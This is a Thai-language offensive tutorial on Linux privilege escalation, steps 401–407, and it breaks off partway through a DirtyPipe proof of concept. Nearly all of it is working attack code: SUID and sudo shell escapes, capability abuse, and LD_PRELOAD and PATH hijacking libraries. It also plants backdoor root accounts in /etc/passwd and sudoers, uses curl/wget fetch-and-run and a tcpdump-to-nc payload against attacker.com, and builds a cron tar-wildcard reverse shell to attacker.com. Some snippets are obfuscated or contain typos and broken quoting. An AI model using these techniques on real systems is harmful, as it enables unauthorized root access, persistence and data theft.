# Part 41: Advanced Linux Privilege Escalation (Steps 401-410)

## ภาพรวม
เทคนิคการยกระดับสิทธิ์บน Linux ขั้นสูง ครอบคลุม SUID/SGID abuse, sudo misconfigurations, capabilities, cron job hijacking, path injection, kernel exploits, service exploitation, Docker escapes, NFS misconfiguration, LD_PRELOAD attacks

---

## Step 401: Linux PrivEsc Enumeration

```bash
#!/bin/bash
# Linux Privilege Escalation Enumeration Script

echo "=== Linux PrivEsc Enumeration ==="
echo "Running as: $(id)"
echo "Hostname: $(hostname)"
echo "OS: $(cat /etc/os-release | head -3)"
echo "Kernel: $(uname -r)"
echo ""

# --- System Info ---
echo "[*] CPU Architecture:"
uname -m

echo "[*] Installed packages (Ubuntu/Debian):"
dpkg -l 2>/dev/null | grep -E '(sudo|ssh|nfs|samba)' | head -10

echo "[*] Running processes:"
ps aux --sort=-%cpu 2>/dev/null | head -20

# --- Users & Groups ---
echo "\n[*] Current user info:"
id
echo ""
echo "[*] All users with shell:"
grep -E '/bash|/sh|/zsh' /etc/passwd | cut -d: -f1,3,4,6
echo ""
echo "[*] Users with UID 0 (root):"
awk -F: '($3 == 0) {print}' /etc/passwd
echo ""
echo "[*] Sudo permissions:"
sudo -l 2>/dev/null

# --- SUID/SGID ---
echo "\n[*] SUID files:"
find / -perm -4000 -type f 2>/dev/null | sort
echo ""
echo "[*] SGID files:"
find / -perm -2000 -type f 2>/dev/null | sort

# --- World-writable ---
echo "\n[*] World-writable directories:"
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

echo "[*] World-writable files:"
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | head -20

# --- Capabilities ---
echo "\n[*] Files with capabilities:"
getcap -r / 2>/dev/null

# --- Cron Jobs ---
echo "\n[*] Cron jobs:"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
crontab -l 2>/dev/null
find /etc/cron* -type f 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# --- Network ---
echo "\n[*] Network interfaces:"
ip addr 2>/dev/null || ifconfig 2>/dev/null
echo ""
echo "[*] Open ports:"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo ""
echo "[*] ARP table:"
arp -a 2>/dev/null

# --- Services ---
echo "\n[*] Running services:"
systemctl list-units --type=service --state=running 2>/dev/null | head -20

# --- Files & Directories ---
echo "\n[*] Files owned by root with write permission:"
find / -user root -writable -type f 2>/dev/null | grep -v proc | grep -v sys | head -20

echo "[*] Interesting config files:"
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
ls -la /root /home/*/  2>/dev/null

# --- Environment ---
echo "\n[*] Environment variables:"
env
echo ""
echo "[*] Readable /etc/shadow:"
head -5 /etc/shadow 2>/dev/null

# --- NFS ---
echo "\n[*] NFS shares:"
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# --- SSH ---
echo "\n[*] SSH keys:"
find / -name 'authorized_keys' 2>/dev/null
find / -name 'id_rsa' 2>/dev/null
find / -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -10

# --- Docker ---
echo "\n[*] Docker:"
id | grep docker
docker ps 2>/dev/null
ls -la /var/run/docker.sock 2>/dev/null

# --- Password Files ---
echo "\n[*] Files containing 'password':"
grep -r 'password\|passwd\|secret\|credential' /etc/ 2>/dev/null | \
    grep -v Binary | grep -v '#' | head -20

find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | \
    xargs grep -l 'password\|passwd' 2>/dev/null | head -10

echo "\n=== Enumeration Complete ==="
```

---

## Step 402: SUID/SGID Exploitation

```python
import subprocess
import os
from typing import List, Dict

class SUIDBinExploiter:
    """สำรวจและใช้ SUID/SGID binaries เพื่อ PrivEsc"""
    
    GTFOBINS_SUID = {
        'bash': 'bash -p',
        'sh': 'sh -p',
        'python': 'python -c "import os; os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104), chr(98)+chr(97)+chr(115)+chr(104), chr(45)+chr(112))"',
        'python3': 'python3 -c "import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")"',
        'perl': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";',
        'ruby': 'ruby -e \'Process::Sys.setuid(0); exec "/bin/sh"\'',
        'find': 'find . -exec /bin/sh -p \\; -quit',
        'vim': 'vim -c ":py import os; os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(98)+chr(97)+chr(115)+chr(104), chr(98)+chr(97)+chr(115)+chr(104), chr(45)+chr(112))"',
        'nano': 'nano /etc/sudoers  # Then add user ALL=(ALL) NOPASSWD:ALL',
        'less': 'less /etc/passwd  # Then !sh',
        'more': 'more /etc/passwd  # Then !sh',
        'man': 'man man  # Then !sh',
        'awk': 'awk \'BEGIN {system("/bin/sh -p")}',
        'cp': 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p',
        'mv': 'mv /bin/sh /tmp/sh && cp /bin/bash /bin/sh  # dangerous!',
        'env': 'env /bin/sh -p',
        'tee': 'echo "user ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers',
        'dd': 'echo "root2:$(openssl passwd new_pass):0:0:root:/root:/bin/bash" | dd of=/etc/passwd bs=1 seek=$(wc -c < /etc/passwd) oflag=append conv=notrunc',
        'cat': 'cat /etc/shadow  # Read sensitive files',
        'tail': 'tail -f /etc/shadow',
        'head': 'head -1 /etc/shadow',
        'wget': 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh',
        'curl': 'curl http://attacker.com/shell.sh | sh',
        'tar': 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        'zip': 'zip /tmp/o.zip /tmp/o -T --unzip-command="sh -c /bin/sh"',
        'gzip': 'gzip -f /etc/shadow > /tmp/shadow.gz  # Read compressed',
        'base64': 'base64 /etc/shadow | base64 --decode',
        'nmap': 'nmap --interactive  # Then !sh (older versions)',
        'pkexec': 'pkexec /bin/sh  # CVE-2021-4034 (Polkit)',
        'strace': 'strace -o /dev/null /bin/sh -p',
        'ltrace': 'ltrace /bin/sh -p',
        'node': 'node -e "require(\'child_process\').spawn(\'/bin/sh\', [\'-p\'], {stdio: [0, 1, 2]})"',
    }
    
    def find_suid_binaries(self) -> List[str]:
        """ค้นหา SUID binaries ที่สามารถใช้ได้"""
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True, text=True, timeout=30
            )
            binaries = [b.strip() for b in result.stdout.split('\n') if b.strip()]
            return binaries
        except Exception as e:
            print(f"Error: {e}")
            return []
    
    def check_exploitable(self, suid_binaries: List[str]) -> List[Dict]:
        """ตรวจว่า binary ไหนเป็น SUID และสามารถใช้ได้"""
        exploitable = []
        
        for binary in suid_binaries:
            binary_name = os.path.basename(binary).lower()
            
            if binary_name in self.GTFOBINS_SUID:
                exploit = {
                    'binary': binary,
                    'name': binary_name,
                    'exploit_command': self.GTFOBINS_SUID[binary_name],
                    'risk': 'HIGH'
                }
                exploitable.append(exploit)
                print(f"[!] EXPLOITABLE SUID: {binary}")
                print(f"    Command: {exploit['exploit_command'][:60]}...")
        
        return exploitable
    
    def demonstrate_suid_python(self) -> str:
        """Demo Python SUID exploitation"""
        return """
# If /usr/bin/python3 has SUID set:
# ls -la /usr/bin/python3
# -rwsr-xr-x 1 root root ... /usr/bin/python3

# Method 1: Spawn shell with root privileges
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Method 2: Read sensitive files
python3 -c "print(open('/etc/shadow').read())"

# Method 3: Write to system files
python3 -c "
with open('/etc/sudoers', 'a') as f:
    f.write('\n\nALL ALL=(ALL) NOPASSWD:ALL\n')
"

# Method 4: Add root user
python3 -c "
import crypt, os
hash = crypt.crypt('rootpass', crypt.mksalt(crypt.METHOD_SHA512))
with open('/etc/passwd', 'a') as f:
    f.write(f'backdoor:{hash}:0:0:root:/root:/bin/bash\\n')
"
"""


# Custom SUID binary exploitation
SUID_EXPLOIT_EXAMPLES = '''
#!/bin/bash
# SUID Exploitation Examples

# 1. find SUID
find / -perm -4000 2>/dev/null
# Exploit:
find . -exec /bin/sh -p \\; -quit

# 2. Custom SUID binary with relative path
# If a SUID binary calls system("service apache2 start");
# and doesn't use absolute path:
export PATH=/tmp:$PATH
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service
# Run the vulnerable SUID binary

# 3. Shared library injection with SUID
# If binary uses LD_LIBRARY_PATH and is SUID (old kernels)
ldd /usr/sbin/vulnerable_suid  # check libraries
cat > /tmp/libexample.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libexample.so /tmp/libexample.c
LD_LIBRARY_PATH=/tmp /usr/sbin/vulnerable_suid

# 4. Writable SUID binary
# If /usr/bin/suid_binary is writable:
cp /bin/bash /tmp/backup_bash
cat /bin/bash > /usr/bin/suid_binary  # Replace with bash
/usr/bin/suid_binary -p  # Should give root shell
'''
```

---

## Step 403: Sudo Misconfigurations

```python
import subprocess
import re
from typing import List, Dict, Optional

class SudoPrivEsc:
    """ใช้ประโยชน์ sudo misconfiguration เพื่อ PrivEsc"""
    
    SUDO_EXPLOITS = {
        # (user) /bin/binary -> exploit
        '/bin/bash': 'sudo /bin/bash',
        '/bin/sh': 'sudo /bin/sh',
        'python': 'sudo python -c "import pty; pty.spawn(\''/bin/bash\'')"',
        'python3': 'sudo python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
        '/usr/bin/python': 'sudo python -c "import os; os.system(\'/bin/bash\')"',
        'vim': 'sudo vim -c ":!bash"',
        'vi': 'sudo vi -c ":!bash"',
        'nano': 'sudo nano /etc/passwd  # Add root user',
        'less': 'sudo less /etc/passwd  # Then !bash',
        'more': 'sudo more /etc/passwd  # Then !bash',
        'man': 'sudo man ls  # Then !bash',
        'find': 'sudo find . -exec /bin/bash \\;',
        'awk': "sudo awk 'BEGIN {system(\"/bin/bash\")' }'",
        'nmap': 'sudo nmap --interactive  # Then !bash',
        'tcpdump': 'echo \'id | nc attacker.com 4444\' > /tmp/x; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x',
        'zip': 'sudo zip /tmp/x /etc/hosts -T --unzip-command="sh -c /bin/bash"',
        'tar': 'sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash',
        'git': 'sudo git -p help config  # Then !/bin/bash',
        'ftp': 'sudo ftp  # Then !bash',
        'irb': 'sudo irb  # Then exec "/bin/bash"',
        'node': 'sudo node -e "require(\'child_process\').spawn(\'bash\', {stdio:[0,1,2]})',
        'perl': "sudo perl -e 'exec \"/bin/bash\"'",
        'ruby': "sudo ruby -e 'exec \"/bin/bash\"'",
        'lua': 'sudo lua -e \'os.execute("/bin/bash")\"',
        'env': 'sudo env /bin/bash',
        'strace': 'sudo strace /bin/bash',
        'ed': 'sudo ed  # Then !bash',
        'emacs': 'sudo emacs -Q -nw --eval "(shell)"',
        'wget': 'sudo wget http://attacker.com/shell.sh -O /etc/cron.d/shell && sudo chmod +x /etc/cron.d/shell',
        'curl': 'sudo curl http://attacker.com/evil.sh | sudo bash',
        'socat': 'sudo socat stdin exec:/bin/bash',
        'tclsh': 'sudo tclsh  # Then exec /bin/bash',
        'script': 'sudo script /dev/null',
    }
    
    def parse_sudo_l(self) -> List[Dict]:
        """อ่านและ parse sudo -l"""
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
            output = result.stdout + result.stderr
            return self._parse_sudoers(output)
        except Exception:
            return []
    
    def _parse_sudoers(self, sudo_l_output: str) -> List[Dict]:
        """Parse sudo -l output"""
        permissions = []
        
        for line in sudo_l_output.split('\n'):
            # Match: (user) /path/to/command
            match = re.search(r'\(([^)]+)\)\s+(.+)', line.strip())
            if match:
                run_as = match.group(1)
                commands = match.group(2)
                
                perm = {
                    'run_as': run_as,
                    'commands': commands,
                    'nopasswd': 'NOPASSWD' in line,
                    'exploits': []
                }
                
                # Check for exploitable commands
                for cmd, exploit in self.SUDO_EXPLOITS.items():
                    if cmd in commands:
                        perm['exploits'].append({
                            'command': cmd,
                            'exploit': exploit
                        })
                
                # Check for wildcard
                if '*' in commands or 'ALL' in commands:
                    perm['exploits'].append({
                        'command': 'wildcard',
                        'exploit': 'sudo /bin/bash'
                    })
                
                permissions.append(perm)
        
        return permissions
    
    def check_sudo_cve_2021_3156(self) -> bool:
        """ตรวจสอบ CVE-2021-3156 (Baron Samedit) sudo heap overflow"""
        # sudo versions < 1.9.5p2
        try:
            result = subprocess.run(['sudo', '--version'], capture_output=True, text=True)
            version_line = result.stdout.split('\n')[0]
            match = re.search(r'(\d+\.\d+\.\d+)', version_line)
            if match:
                version = match.group(1)
                parts = [int(x) for x in version.split('.')]
                # Vulnerable: < 1.9.5p2 and < 1.8.32
                if parts[0] == 1 and parts[1] <= 8:
                    print(f"POTENTIALLY VULNERABLE: sudo {version} (CVE-2021-3156)")
                    return True
                elif parts[0] == 1 and parts[1] == 9 and parts[2] < 5:
                    print(f"POTENTIALLY VULNERABLE: sudo {version} (CVE-2021-3156)")
                    return True
        except Exception:
            pass
        return False
    
    def demonstrate_sudo_bypass_techniques(self) -> str:
        """Show sudo bypass techniques"""
        return """
# Technique 1: sudo with shell escape
# If: (root) /usr/bin/vim
sudo vim -c ':!bash'
sudo vim -c ':python import pty; pty.spawn("/bin/bash")'
sudo vim -c ':lua os.execute("/bin/bash")'

# Technique 2: Environment variables in sudo
# sudo -l shows: env_keep+=LD_PRELOAD
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find

# Technique 3: Sudo token reuse
# If another user is using sudo, steal their token
sudo -n true 2>/dev/null && sudo /bin/bash  # No password if cached

# Technique 4: sudo -u#-1 (CVE-2019-14287)
# sudo < 1.8.28
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash  # Overflow to root

# Technique 5: Pathname bypass
# If sudo allows: /usr/bin/program arg1
sudo /usr/bin/program arg1 '  # space before quote = shell escape?'
"""


SUDO_PRIVESC_EXAMPLES = '''
#!/bin/bash
# Common sudo PrivEsc scenarios

# Check sudo permissions first
sudo -l

# CVE-2021-3156 Baron Samedit
sudoedit -s / 2>&1 | grep -qi usage && echo "Not Vulnerable"
sudoedit -s '\\' $(python3 -c 'print("A"*65536)') 2>&1 | grep -q core && echo "VULNERABLE!"

# CVE-2019-14287
# Test: sudo -u#-1 id
sudo -u#-1 id 2>/dev/null | grep root && echo "VULNERABLE to CVE-2019-14287!"

# CVE-2021-22555 (Linux heap overflow via netfilter)
# Requires: CAP_NET_ADMIN or unprivileged user namespaces

# Sudo version
sudo --version
'''
```

---

## Step 404: Linux Capabilities Exploitation

```python
import subprocess
import os
from typing import List, Dict

class CapabilitiesExploit:
    """ใช้ Linux Capabilities เพื่อ PrivEsc"""
    
    DANGEROUS_CAPS = {
        'cap_setuid': {
            'description': 'Can change UID to 0',
            'exploit': 'python3 -c "import os; os.setuid(0); os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))"'
        },
        'cap_setgid': {
            'description': 'Can change GID',
            'exploit': 'python3 -c "import os; os.setgid(0); os.system(\'/bin/bash\')"'
        },
        'cap_sys_ptrace': {
            'description': 'Can trace/inject into other processes',
            'exploit': 'Use gdb/strace to inject shellcode into root process'
        },
        'cap_sys_admin': {
            'description': 'Super capability - almost root equivalent',
            'exploit': 'mount, clone namespaces, various kernel interfaces'
        },
        'cap_dac_override': {
            'description': 'Bypass file read/write/execute permission checks',
            'exploit': 'python3 -c "print(open(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(115)+chr(104)+chr(97)+chr(100)+chr(111)+chr(119)).read())"'
        },
        'cap_dac_read_search': {
            'description': 'Bypass file read permission',
            'exploit': 'tar cf /dev/null --wildcards --no-recursion -P \'*\' / 2>&1 | grep shadow'
        },
        'cap_net_raw': {
            'description': 'Can use RAW and PACKET sockets',
            'exploit': 'Packet sniffing even without root'
        },
        'cap_chown': {
            'description': 'Make arbitrary changes to file UIDs/GIDs',
            'exploit': 'chown user:user /etc/shadow  # Then read it'
        },
        'cap_fowner': {
            'description': 'Bypass permission checks where file UID must match',
            'exploit': 'chmod 777 /etc/shadow'
        },
        'cap_sys_chroot': {
            'description': 'Use chroot()',
            'exploit': 'chroot escape techniques'
        },
        'cap_mknod': {
            'description': 'Create special files using mknod',
            'exploit': 'Create device files to read memory'
        },
    }
    
    def find_capabilities(self) -> List[Dict]:
        """ค้นหา files ที่มี capabilities"""
        try:
            result = subprocess.run(
                ['getcap', '-r', '/'],
                capture_output=True, text=True, timeout=30
            )
            
            findings = []
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split(' = ')
                    if len(parts) == 2:
                        binary = parts[0].strip()
                        caps = parts[1].strip()
                        
                        finding = {
                            'binary': binary,
                            'capabilities': caps,
                            'dangerous': [],
                            'exploits': []
                        }
                        
                        for cap, info in self.DANGEROUS_CAPS.items():
                            if cap in caps.lower():
                                finding['dangerous'].append(cap)
                                finding['exploits'].append(info['exploit'])
                        
                        if finding['dangerous']:
                            print(f"[!] DANGEROUS: {binary} has {caps}")
                        
                        findings.append(finding)
            
            return findings
        except Exception as e:
            print(f"Error: {e}")
            return []
    
    def exploit_cap_setuid_python(self, python_path: str) -> str:
        """Exploit cap_setuid on Python binary"""
        return f"""
# Python binary with cap_setuid+ep:
# {python_path} = cap_setuid+ep

# Method 1: setuid(0) then spawn shell
{python_path} -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Method 2: Add to /etc/passwd
{python_path} -c '
import os
os.setuid(0)
with open("/etc/passwd", "a") as f:
    f.write("backdoor::0:0:root:/root:/bin/bash\\n")
'
"""
    
    def exploit_cap_dac_read_python(self, python_path: str) -> str:
        """Exploit cap_dac_read_search on Python"""
        return f"""
# Python binary with cap_dac_read_search:
{python_path} -c 'print(open("/etc/shadow").read())'
{python_path} -c 'print(open("/root/.ssh/id_rsa").read())'
"""
    
    def exploit_cap_sys_ptrace(self) -> str:
        """Exploit cap_sys_ptrace to inject into root process"""
        return """
# Find root process to inject into
pgrep -u root sshd  # or any root process

# Python injection using ctypes (requires cap_sys_ptrace)
python3 inject.py <PID>

# inject.py content:
import ctypes
import ctypes.util
import sys

ARCH_PRCTL = 158
PTRACE_ATTACH = 16
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7
PTRACE_DETACH = 17

# Shellcode: execve("/bin/bash", ["/bin/bash", "-p", NULL], NULL)
shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
"""


CAP_EXAMPLES = '''
#!/bin/bash
# Linux Capabilities Examples

# List capabilities of running processes
cat /proc/$$/status | grep Cap

# Decode capability bitmask
capsh --decode=0000000000000000

# Check specific binary
getcap /usr/bin/python3
getcap /usr/bin/perl
getcap /usr/bin/ruby

# exploit cap_net_raw for packet capture
python3 -c "
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
while True:
    data = s.recv(65535)
    print(data[:20].hex())
"

# exploit cap_chown
python3 -c "import os; os.chown('/etc/shadow', os.getuid(), os.getgid())"

# exploit cap_fowner  
python3 -c "import os; os.chmod('/etc/shadow', 0o777)"
cat /etc/shadow
'''
```

---

## Step 405: Cron Job Exploitation

```bash
#!/bin/bash
# Cron Job Privilege Escalation Techniques

echo "=== Cron Job PrivEsc ==="

# 1. Find cron jobs
echo "[*] System cron jobs:"
cat /etc/crontab 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null

# User crontabs
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -v '^#' | grep -q '.' && \
        echo "Crontab for $user:" && crontab -u $user -l 2>/dev/null
done

# 2. Find writable cron scripts
echo "\n[*] Writable cron scripts:"
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly; do
    for script in $dir/*; do
        [ -f "$script" ] && [ -w "$script" ] && \
            echo "WRITABLE: $script"
    done
done

# 3. Find scripts called by cron that we can write to
echo "\n[*] Scripts called by cron:"
grep -r '/[a-zA-Z0-9./_-]*\.sh\|/[a-zA-Z0-9./_-]*\.py\|/[a-zA-Z0-9./_-]*\.pl' \
    /etc/crontab /etc/cron.d/* 2>/dev/null

# 4. PATH hijacking in cron
# If cron uses relative paths like: * * * * * root cleanup.sh
# and /tmp is in cron's PATH:
echo "\n[*] Cron PATH:"
grep 'PATH' /etc/crontab 2>/dev/null

# 5. Monitor cron execution (find new processes created by cron)
echo "\n[*] Monitoring cron execution:"
# ps aux with watch
watch -n 1 'ps aux | grep cron'

# pspy for cron monitoring (no root needed)
if [ -f /tmp/pspy64 ]; then
    /tmp/pspy64 -pf -i 1000
fi

# 6. Exploit writable cron directory
# If we can write to /etc/cron.d/:
cat > /etc/cron.d/backdoor << 'EOF'
* * * * * root /tmp/revshell.sh
EOF

# 7. Wildcard injection in tar backup cron
# If cron runs: tar -czf /backup.tar.gz /home/*
# Create files that become tar arguments:
cd /home/user
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc.sh'
cat > privesc.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
chmod +x privesc.sh
```

---

## Step 406: PATH Injection และ Library Hijacking

```python
import os
import subprocess
from typing import List, Dict

class PathInjectionExploit:
    """ใช้ PATH hijacking และ library injection เพื่อ PrivEsc"""
    
    def find_path_injection_opportunities(self) -> List[Dict]:
        """ค้นหา SUID binaries ที่ใช้ relative paths"""
        opportunities = []
        
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True, text=True, timeout=30
            )
            
            suid_binaries = [b.strip() for b in result.stdout.split('\n') if b.strip()]
            
            for binary in suid_binaries:
                try:
                    # Check strings for system() calls with relative paths
                    strings_result = subprocess.run(
                        ['strings', binary],
                        capture_output=True, text=True, timeout=10
                    )
                    
                    for line in strings_result.stdout.split('\n'):
                        line = line.strip()
                        # Relative command (no leading /)
                        if line and not line.startswith('/') and \
                           not line.startswith('-') and \
                           len(line) < 30 and ' ' not in line and \
                           line in ['service', 'curl', 'wget', 'python', 
                                   'perl', 'sh', 'bash', 'ls', 'cat',
                                   'cp', 'mv', 'rm', 'chmod', 'chown']:
                            opportunities.append({
                                'binary': binary,
                                'calls': line,
                                'exploit': self._generate_path_hijack(line)
                            })
                            print(f"[!] {binary} calls '{line}' - potential PATH injection!")
                except Exception:
                    pass
        except Exception:
            pass
        
        return opportunities
    
    def _generate_path_hijack(self, command: str) -> str:
        """Generate PATH hijack payload"""
        return f"""
# Create malicious '{command}' in /tmp
cat > /tmp/{command} << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /tmp/{command}
export PATH=/tmp:$PATH
# Run the vulnerable SUID binary
/tmp/rootbash -p  # After triggering
"""
    
    def ld_preload_exploit(self, vulnerable_sudo_program: str) -> str:
        """ใช้ LD_PRELOAD เมื่อ sudo อนุญาต"""
        return f"""
# Check if LD_PRELOAD is preserved in sudo
sudo -l | grep env_keep

# Create malicious shared library
cat > /tmp/privesc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}}
EOF

gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles

# Run with LD_PRELOAD via sudo
sudo LD_PRELOAD=/tmp/privesc.so {vulnerable_sudo_program}
"""
    
    def ld_library_path_exploit(self) -> str:
        """ใช้ LD_LIBRARY_PATH hijacking"""
        return """
# Check library loading order
ldd /usr/sbin/vulnerable_binary

# Check if LD_LIBRARY_PATH preserved in sudo
sudo -l | grep LD_LIBRARY_PATH

# Find library the binary depends on
ldd /usr/sbin/vulnerable_binary | grep 'not found'

# Create malicious library
cat > /tmp/malicious_lib.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

void malicious_function() {  // replace with actual function name
    system("/bin/bash -p");
}

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/libexample.so.1 /tmp/malicious_lib.c

# Method 1: LD_LIBRARY_PATH
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/vulnerable_binary

# Method 2: Replace library in writable path
/sbin/ldconfig -p | grep libexample  # Find current location
cp /tmp/libexample.so.1 /usr/local/lib/  # If writable
"""
    
    def python_library_hijack(self) -> str:
        """ใช้ Python library hijacking"""
        return """
# If root runs a Python script and we can write to Python's library path

# Check Python's sys.path order
python3 -c 'import sys; print(sys.path)'

# If /tmp or current directory is first in path:
# Create malicious module to override legitimate one
cat > /tmp/os.py << 'EOF'
import subprocess
subprocess.Popen(["/bin/bash", "-p"])
# Then call the real os functions to avoid breaking the script
EOF

# Or override a specific function used by the script
cat > /tmp/requests.py << 'EOF'
import subprocess
subrocess.Popen(["/bin/bash", "-c", "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"])
# Then import real requests
import importlib.util
spec = importlib.util.spec_from_file_location('requests', '/usr/lib/python3/dist-packages/requests/__init__.py')
requests = importlib.util.module_from_spec(spec)
spec.loader.exec_module(requests)
EOF
"""
```

---

## Step 407: Kernel Exploits

```bash
#!/bin/bash
# Linux Kernel Exploit Reference

echo "=== Kernel Version ==="
uname -r
uname -a
cat /proc/version

# Check for known vulnerable kernel versions
KERNEL=$(uname -r | cut -d- -f1)
echo "\nKernel: $KERNEL"

# Known kernel privilege escalation vulnerabilities
cat << 'EOF'
=== Common Linux Kernel CVEs ===

CVE-2022-0847 (DirtyPipe) - Linux 5.8-5.16.10
  write to read-only files, PoC: dirty_pipe.c
  Affected: 5.8+ kernels

CVE-2021-4034 (PwnKit) - Polkit pkexec
  Not kernel, but pkexec SUID binary
  Affects virtually all Linux distros

CVE-2021-33909 (sequoia) - fs/seq_file.c
  size_t-to-int overflow in filesystem layer

CVE-2021-22555 - netfilter heap OOB
  kernel 2.6.19 - 5.12

CVE-2019-13272 - PTRACE_TRACEME pkexec
  kernel < 5.1.17

CVE-2018-18955 - nested user namespaces UID mapping
  kernel 4.15 - 4.18.2

CVE-2017-16995 (eBPF) - kernel < 4.14
  eBPF verifier integer overflow

CVE-2017-6074 - DCCP double-free
  kernel < 4.9.11

CVE-2016-5195 (DirtyCOW) - Memory subsystem race condition
  kernel < 4.8.3, 3.x, 2.6.x

CVE-2015-1328 (OverlayFS) - Ubuntu specific
  Ubuntu 12.04, 14.04, 15.10

CVE-2010-3904 - RDS protocol privilege escalation
CVE-2009-2692 - sock_sendpage NULL pointer
EOF

# DirtyCOW exploit check
check_dirtycow() {
    KERNEL_VER=$(uname -r | awk -F'[-+]' '{print $1}')
    # Parse version
    MAJOR=$(echo $KERNEL_VER | cut -d. -f1)
    MINOR=$(echo $KERNEL_VER | cut -d. -f2)
    PATCH=$(echo $KERNEL_VER | cut -d. -f3)
    
    if [ $MAJOR -lt 4 ] || { [ $MAJOR -eq 4 ] && [ $MINOR -lt 8 ]; } || \
       { [ $MAJOR -eq 4 ] && [ $MINOR -eq 8 ] && [ $PATCH -lt 3 ]; }; then
        echo "[!] POSSIBLY VULNERABLE to DirtyCOW (CVE-2016-5195)!"
    else
        echo "Kernel too new for DirtyCOW"
    fi
}

check_dirtycow

# DirtyPipe check
check_dirtypipe() {
    KERNEL_VER=$(uname -r | awk -F'[-+]' '{print $1}')
    MAJOR=$(echo $KERNEL_VER | cut -d. -f1)
    MINOR=$(echo $KERNEL_VER | cut -d. -f2)
    PATCH=$(echo $KERNEL_VER | cut -d. -f3)
    
    if { [ $MAJOR -eq 5 ] && [ $MINOR -ge 8 ]; } && \
       { [ $MINOR -lt 16 ] || { [ $MINOR -eq 16 ] && [ $PATCH -le 10 ]; }; }; then
        echo "[!] POSSIBLY VULNERABLE to DirtyPipe (CVE-2022-0847)!"
    fi
}

check_dirtypipe
```

```python
# DirtyPipe PoC (CVE-2022-0847) - Python demonstration
# Linux kernel 5.8 to 5.16.10

import os
import sys
from ctypes import *

class DirtyPipePOC:
    """CVE-2022-0847 DirtyPipe - Write to arbitrary read-only files"""
    
    # pipe flags
    PIPE_BUF_FLAG_CAN_MERGE = 0x10
    
    def exploit(self, target_file: str, offset: int, payload: bytes) -> bool:
        """
        Overwrite data at offset in target_file
        Works even if file is read-only, owned by root, etc.
        """
        print(f"[DirtyPipe] Targeting {target_file} at offset {offset}")
        
        # Verify file exists
        if not os.path.exists(target_file):
            return False
        
        # Create pipe
        pipe_r, pipe_w = os.pipe()
        
        try:
            # Fill pipe to set PIPE_BUF_FLAG_CAN_MERGE flag
            # (requires specific kernel page-aligned writes)
            PAGE_SIZE = 4096
            
            # Write to fill pipe and set flags
            drain_count = 65536 // PAGE_SIZE
            for _ in range(drain_count):
                os.write(pipe_w, b'A' * PAGE_SIZE)
            
